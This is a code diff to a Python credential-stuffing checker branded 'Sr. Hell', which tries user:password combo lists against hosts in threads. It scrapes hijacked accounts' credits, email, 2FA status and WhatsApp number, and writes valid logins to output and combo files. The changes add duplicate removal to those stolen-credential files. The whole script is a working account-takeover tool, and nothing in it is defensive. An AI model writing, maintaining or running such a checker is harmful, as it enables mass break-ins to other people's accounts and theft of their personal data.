@@ -37,7 +37,7 @@ else:
     sys.stdout.write(f'\033]2;{NOME}\007')
 
 ascii_art = """\033[93m
-noneee                                              
+noneee
 """
 
 def get_first_combo_file():
@@ -95,7 +95,21 @@ def save_data(nhost, user, password, credits, email, registration_date, twofa, w
     base_path = output_dir
     os.makedirs(base_path, exist_ok=True)
 
-    with open(f"{base_path}/Sr.Hell@{nhost}.txt", "a") as f:
+    file_path = f"{base_path}/Sr.Hell@{nhost}.txt"
+    combo_path = f"{base_path}/Sr.Hell@COMBO(U&P).txt"
+
+    # Verificar e remover duplicatas
+    if os.path.exists(file_path):
+        with open(file_path, "r") as f:
+            lines = f.readlines()
+        with open(file_path, "w") as f:
+            seen = set()
+            for line in lines:
+                if line not in seen:
+                    f.write(line)
+                    seen.add(line)
+
+    with open(file_path, "a") as f:
         f.write(f"\n╼╾ Sr. Hell ╼╾\n")
         f.write(f"╼╾ Universal 𝐏𝐚𝐢𝐧𝐞𝐥 ╼╾\n")
         f.write(f"𝐔𝐒𝐄𝐑: {user}\n")
@@ -105,7 +119,17 @@ def save_data(nhost, user, password, credits, email, registration_date, twofa, w
         f.write(f"╼╼╼╼╼╼╼╼╼╼╼\n")
         f.write(f"╼ˢᶜʳⁱᵖᵗ ᵇʸ ˢʳ ᴴᵉˡˡ╾\n")
 
-    with open(f"{base_path}/Sr.Hell@COMBO(U&P).txt", "a") as f:
+    if os.path.exists(combo_path):
+        with open(combo_path, "r") as f:
+            lines = f.readlines()
+        with open(combo_path, "w") as f:
+            seen = set()
+            for line in lines:
+                if line not in seen:
+                    f.write(line)
+                    seen.add(line)
+
+    with open(combo_path, "a") as f:
         f.write(f"{user}:{password}\n")
 
 def print_valid_login(nhost, user, password, credits):
@@ -154,7 +178,6 @@ def thread_login(nhost, user, password):
 
         registration_date = re.search(r'date_registered\" class=\"form-control\" value=\"([^\"]+)\"', profile_data)
         registration_date = registration_date.group(1) if registration_date else "N/A"
-
         whatsapp = re.search(r'name=\"whatsapp\" class=\"form-control\" placeholder=\"WhatsApp\" value=\"([^\"]+)\"', profile_data)
         whatsapp = whatsapp.group(1) if whatsapp else "N/A"
 
